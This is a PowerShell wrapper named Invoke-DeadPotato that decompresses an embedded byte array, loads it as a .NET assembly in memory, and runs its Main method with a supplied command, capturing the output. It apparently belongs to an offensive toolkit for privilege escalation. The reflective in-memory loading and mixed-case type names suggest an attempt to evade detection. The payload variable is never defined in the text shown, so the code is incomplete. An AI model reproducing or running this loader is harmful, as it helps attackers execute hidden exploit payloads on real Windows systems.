function Invoke-DeadPotato{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command
    )
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $vars = New-Object System.Collections.Generic.List[System.Object]

    foreach ($args in $Command.Split(" "))
    {
        $vars.Add($args)
    }

    $passed = [string[]]$vars.ToArray()

    $BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    $PrivateMethod = [DeadPotato.Program].GetMethod('Main')

    if($PrivateMethod){
      $PrivateMethod.Invoke($Null,@(,$passed))
      }
    else{
      $PrivateMethod = [DeadPotato.Program].GetMethod('Main')
      $PrivateMethod.Invoke($Null,@(,$passed))
      }
     [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}